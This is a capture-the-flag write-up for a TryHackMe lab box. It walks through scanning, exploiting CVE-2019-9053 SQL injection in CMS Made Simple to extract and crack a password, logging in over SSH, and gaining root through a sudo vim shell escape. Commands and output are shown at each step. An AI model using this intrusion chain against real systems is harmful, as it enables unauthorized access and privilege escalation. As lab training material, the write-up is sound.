# Simple-CTF

**IP:** 10.10.89.182  
**Platform:** THM  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 01/06/2025

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.89.182 -oA nmap/Simple-CTF
```

| Port | Service | Version                         |
| ---- | ------- | ------------------------------- |
| 21   | ftp     | vsftpd 3.0.3                    |
| 80   | http    | Apache httpd 2.4.18             |
| 2222 | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |

## Enumeration

I first scanned for web directories with `ffuf`, which lead me to `/simple`, A `CMS Made Simple` application.
```bash
ffuf -u http://10.10.89.182:80/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -c -s -fc 403
.
simple
```

I searched for vulnerabilities for the version `2.2.8` of CMS Made Simple on `searchsploit`, and found an SQL Injection vulnerability `CVE-2019-9053`.
```bash
searchsploit CMS Made Simple 2.2.8

----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                   | php/webapps/46635.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Exploitation

I downloaded and ran the exploit, which gave me a username and password `mitch : secret`
```bash
searchsploit -m 46635
python2 46635.py -u http://10.10.89.182/simple/ --crack -w /usr/share/wordlists/rockyou.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

I used these credentials to SSH into the machine as `mitch`.
```bash
ssh mitch@10.10.89.182 -p 2222

id
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
```

The first flag was in `mitch`'s home directory `/home/mitch/user.txt`.
```bash
cat /home/mitch/user.txt
```

## Privilege Escalation

`mitch` can run `vim` with full NOPASSWD sudo permissions, so I used that to spawn a privileged shell.
```bash
sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
$ sudo vim -c ':!/bin/sh'

id
uid=0(root) gid=0(root) groups=0(root)
```

The second flag is in the `root` user's home directory `/root/root.txt`.
```bash
cat /root/root.txt
```

---
#nmap #ffuf #searchsploit #sqli #cms-made-simple #sudo-privesc #vim-privesc #password-cracking
